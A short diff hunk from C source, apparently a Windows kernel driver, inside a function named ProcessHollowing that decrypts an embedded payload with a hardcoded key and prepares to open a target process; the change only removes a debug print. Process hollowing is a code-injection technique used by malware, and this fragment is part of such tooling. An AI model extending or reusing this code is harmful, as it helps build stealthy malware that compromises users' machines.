@@ -156,8 +156,6 @@ NTSTATUS ProcessHollowing()
 
 	decrypt(payload, sizeof(payload), "1234567890");
 
-	DbgPrint("[+] BYTE 1: %d\n", sizeof(payload));
-
 	clientId.UniqueProcess = hTarget;
 	clientId.UniqueThread = NULL;
 	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
